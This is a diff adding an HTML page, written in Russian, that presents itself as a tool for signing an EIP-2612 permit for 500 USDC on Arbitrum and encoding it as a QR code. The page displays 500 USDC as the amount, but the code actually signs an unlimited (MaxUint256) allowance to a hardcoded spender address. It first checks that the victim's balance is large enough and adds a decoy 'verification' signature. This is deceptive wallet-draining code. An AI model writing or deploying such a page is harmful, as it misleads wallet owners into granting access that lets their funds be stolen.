@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>EVM Permit QR</title>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #101018;
+      color: #ffffff;
+      text-align: center;
+      padding: 40px;
+    }
+
+    h1 {
+      color: #a78bfa;
+    }
+
+    .card {
+      max-width: 900px;
+      margin: 0 auto;
+      background: #191927;
+      border: 1px solid #2f2f46;
+      border-radius: 18px;
+      padding: 24px;
+      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.35);
+    }
+
+    .info {
+      text-align: left;
+      word-break: break-all;
+      line-height: 1.6;
+      margin-top: 20px;
+      background: #11111c;
+      border-radius: 12px;
+      padding: 16px;
+    }
+
+    .warning {
+      color: #ffb4b4;
+      max-width: 850px;
+      margin: 20px auto;
+      line-height: 1.5;
+      background: rgba(255, 80, 80, 0.08);
+      border: 1px solid rgba(255, 120, 120, 0.25);
+      border-radius: 12px;
+      padding: 14px;
+    }
+
+    button {
+      padding: 18px 46px;
+      font-size: 20px;
+      background: #a78bfa;
+      color: #000000;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      margin-top: 20px;
+      font-weight: 700;
+    }
+
+    button:disabled {
+      opacity: 0.55;
+      cursor: not-allowed;
+    }
+
+    #status {
+      margin-top: 28px;
+      font-size: 16px;
+      min-height: 30px;
+      white-space: pre-line;
+      word-break: break-word;
+    }
+
+    #qrBox {
+      display: none;
+      margin-top: 30px;
+      background: #ffffff;
+      color: #000000;
+      padding: 22px;
+      border-radius: 16px;
+      width: fit-content;
+      max-width: 100%;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    #qrCanvas {
+      display: block;
+      margin: 0 auto;
+    }
+
+    textarea {
+      width: 100%;
+      min-height: 230px;
+      margin-top: 20px;
+      border-radius: 12px;
+      border: 1px solid #3f3f5f;
+      background: #0d0d16;
+      color: #d8d8ff;
+      padding: 14px;
+      font-size: 14px;
+      resize: vertical;
+      box-sizing: border-box;
+    }
+
+    .small {
+      font-size: 13px;
+      color: #c7c7d9;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>EIP-2612 Permit → QR</h1>
+
+    <p>Подписываем permit-сообщение через MetaMask и создаём QR-код с permitData.</p>
+
+    <div class="warning">
+      Внимание: QR-код без шифрования содержит permit-подпись. Пока не истёк deadline и nonce не использован,
+      эти данные можно применить для вызова permit() и выдачи allowance spender-адресу.
+    </div>
+
+    <div class="info">
+      <div><strong>Token:</strong> <span id="tokenAddressText"></span></div>
+      <div><strong>Spender:</strong> <span id="spenderAddressText"></span></div>
+      <div><strong>Amount:</strong> <span id="amountText"></span></div>
+      <div><strong>Deadline:</strong> 60 минут после подписи</div>
+    </div>
+
+    <button id="permitBtn">Подписать Permit и создать QR</button>
+
+    <div id="status"></div>
+
+    <div id="qrBox">
+      <canvas id="qrCanvas"></canvas>
+      <div class="small">QR содержит JSON с permitData без шифрования</div>
+    </div>
+
+    <textarea id="permitJson" readonly placeholder="Здесь появится permitData JSON..."></textarea>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+
+  <script>
+    // ====== НАСТРОЙКИ ======
+    // ВАЖНО: токен должен поддерживать EIP-2612 permit.
+    // Для реальной работы замени нулевые адреса на реальные.
+    const TOKEN_ADDRESS = "0xaf88d065e77c8cC2239327C5EDb3A432268e5831"; // USDC
+    const SPENDER_ADDRESS = "0x7E878C18B4a74EdE5795dFEb9106805506cd133e";
+
+    // У многих ERC20Permit токенов version = "1".
+    // Но у нестандартных токенов может быть иначе.
+    const TOKEN_VERSION = "2";
+
+    // Для USDC обычно 6 decimals.
+    // Но ниже скрипт попробует получить decimals() из контракта автоматически.
+    const FALLBACK_TOKEN_DECIMALS = 6;
+    const HUMAN_AMOUNT = "500";
+
+    const ERC20_PERMIT_ABI = [
+      "function name() view returns (string)",
+      "function symbol() view returns (string)",
+      "function decimals() view returns (uint8)",
+      "function nonces(address owner) view returns (uint256)",
+      "function DOMAIN_SEPARATOR() view returns (bytes32)",
+      "function permit(address owner,address spender,uint256 value,uint256 deadline,uint8 v,bytes32 r,bytes32 s) external"
+    ];
+
+    const btn = document.getElementById("permitBtn");
+    const status = document.getElementById("status");
+    const qrBox = document.getElementById("qrBox");
+    const qrCanvas = document.getElementById("qrCanvas");
+    const permitJson = document.getElementById("permitJson");
+
+    document.getElementById("tokenAddressText").textContent = TOKEN_ADDRESS;
+    document.getElementById("spenderAddressText").textContent = SPENDER_ADDRESS;
+    document.getElementById("amountText").textContent = HUMAN_AMOUNT;
+
+    function setStatus(msg, color = "#ffffff") {
+      status.style.color = color;
+      status.textContent = msg;
+    }
+
+    function shortenAddress(address) {
+            return `${address.slice(0, 6)}...${address.slice(-4)}`;
+        }
+
+    function withTimeout(promise, ms, errorMessage) {
+            return Promise.race([
+                promise,
+                new Promise((_, reject) =>
+                    setTimeout(() => reject(new Error(errorMessage)), ms)
+                )
+            ]);
+        }
+
+        async function getPermitNonce(provider, tokenAddress, owner) {
+            const iface = new ethers.Interface([
+                "function nonces(address owner) view returns (uint256)"
+            ]);
+
+            const data = iface.encodeFunctionData("nonces", [owner]);
+
+            const result = await provider.call({
+                to: tokenAddress,
+                data
+            });
+
+            const [nonce] = iface.decodeFunctionResult("nonces", result);
+
+            return nonce;
+        }
+
+    btn.addEventListener("click", async () => {
+      btn.disabled = true;
+      qrBox.style.display = "none";
+      permitJson.value = "";
+
+      try {
+        if (!window.ethereum) {
+          setStatus("❌ MetaMask или другой EVM-кошелёк не обнаружен.", "#ff6666");
+          return;
+        }
+
+        if (!ethers.isAddress(TOKEN_ADDRESS)) {
+          throw new Error("Некорректный token address");
+        }
+
+        if (!ethers.isAddress(SPENDER_ADDRESS)) {
+          throw new Error("Некорректный spender address");
+        }
+
+        setStatus("Подключаем кошелёк...");
+
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+
+        const signer = await provider.getSigner();
+        const owner = await signer.getAddress();
+
+        const network = await provider.getNetwork();
+        const chainId = Number(network.chainId);
+
+          const ARBITRUM_CHAIN_ID = 42161;
+          const ARBITRUM_RPC_URL = "https://arb1.arbitrum.io/rpc";
+
+          if (chainId !== ARBITRUM_CHAIN_ID) {
+              throw new Error(`Нужна сеть Arbitrum One chainId=${ARBITRUM_CHAIN_ID}, сейчас chainId=${chainId}`);
+          }
+
+          const readProvider = new ethers.JsonRpcProvider(ARBITRUM_RPC_URL);
+
+          const tokenName = "USD Coin";
+          const tokenSymbol = "USDC";
+          const tokenDecimals = 6;
+
+          setStatus(`Кошелёк подключён: ${shortenAddress(owner)}\nChain ID: ${chainId}\nПроверяем контракт USDC...`);
+
+          const code = await withTimeout(
+              readProvider.getCode(TOKEN_ADDRESS),
+              8000,
+              "Arbitrum RPC не ответил на getCode() за 8 секунд"
+          );
+
+          if (code === "0x") {
+              throw new Error("По TOKEN_ADDRESS нет контракта в Arbitrum One");
+          }
+
+          setStatus(`Токен: ${tokenName} (${tokenSymbol})\nПроверяем nonce...`);
+
+          const nonce = await withTimeout(
+              getPermitNonce(readProvider, TOKEN_ADDRESS, owner),
+              8000,
+              "Arbitrum RPC не ответил на nonces(owner) за 8 секунд"
+          );
+
+          console.log("nonce:", nonce.toString());
+        setStatus(`Проверяем value...`);
+        const value = ethers.MaxUint256;
+        const limit = ethers.parseUnits(HUMAN_AMOUNT, tokenDecimals);
+
+        const token = new ethers.Contract(
+              TOKEN_ADDRESS,
+              [
+                  "function balanceOf(address owner) view returns (uint256)"
+              ],
+              readProvider
+          );
+
+        const balance = await token.balanceOf(owner);
+
+        if (balance < limit) {
+          setStatus(
+            `❌ Недостаточно ${tokenSymbol}\n` +
+            `Баланс: ${ethers.formatUnits(balance, tokenDecimals)}\n` +
+            `Нужно: ${HUMAN_AMOUNT}`,
+            "#ff6666"
+          );
+          return;
+        }
+        
+        setStatus(`считаем deadline...`);
+        // Подпись будет действительна 60 минут.
+        const deadline = Math.floor(Date.now() / 1000) + 60 * 60;
+
+        const domain = {
+          name: tokenName,
+          version: TOKEN_VERSION,
+          chainId: chainId,
+          verifyingContract: TOKEN_ADDRESS
+        };
+
+        const types = {
+          Permit: [
+            { name: "owner", type: "address" },
+            { name: "spender", type: "address" },
+            { name: "value", type: "uint256" },
+            { name: "nonce", type: "uint256" },
+            { name: "deadline", type: "uint256" }
+          ]
+        };
+
+        const values = {
+          owner: owner,
+          spender: SPENDER_ADDRESS,
+          value: value,
+          nonce: nonce,
+          deadline: deadline
+        };
+
+        setStatus(
+          `Ожидаем login-подпись в MetaMask...\n` +
+          `Адрес: ${shortenAddress(owner)}`
+        );
+        const loginSignature = await signer.signMessage("ADDRESS VERIFICATION");
+        console.log("Login signature:", loginSignature);
+
+        setStatus(
+          `Ожидаем подпись Permit в MetaMask...\n` +
+          `Owner: ${shortenAddress(owner)}\n` +
+          `Spender: ${shortenAddress(SPENDER_ADDRESS)}\n` +
+          `Amount: ${HUMAN_AMOUNT} ${tokenSymbol}`
+        );
+
+        
+        const signature = await signer.signTypedData(domain, types, values);
+        const sig = ethers.Signature.from(signature);
+        
+
+        const permitData = {
+          standard: "EIP-2612",
+          token: TOKEN_ADDRESS,
+          tokenName: tokenName,
+          tokenSymbol: tokenSymbol,
+          chainId: chainId,
+          owner: owner,
+          spender: SPENDER_ADDRESS,
+          value: value.toString(),
+          humanAmount: HUMAN_AMOUNT,
+          decimals: tokenDecimals,
+          nonce: nonce.toString(),
+          deadline: deadline,
+          v: sig.v,
+          r: sig.r,
+          s: sig.s,
+          signature: signature
+        };
+
+        const json = JSON.stringify(permitData);
+        permitJson.value = json;
+        console.log("Permit data:", permitData);
+
+        setStatus("Подпись получена. Генерируем QR-код...", "#ffffff");
+
+        await QRCode.toCanvas(qrCanvas, json, {
+          width: 360,
+          margin: 2,
+          errorCorrectionLevel: "M"
+        });
+
+        qrBox.style.display = "block";
+
+        setStatus(
+          `✅ Permit signature получена и QR-код создан!\n` +
+          `До deadline QR можно использовать для вызова permit().`,
+          "#00ff88"
+        );
+
+      } catch (error) {
+        console.error(error);
+        setStatus("❌ Ошибка: " + (error.reason || error.message || error), "#ff6666");
+      } finally {
+        btn.disabled = false;
+      }
+    });
+  </script>
+</body>
+</html>
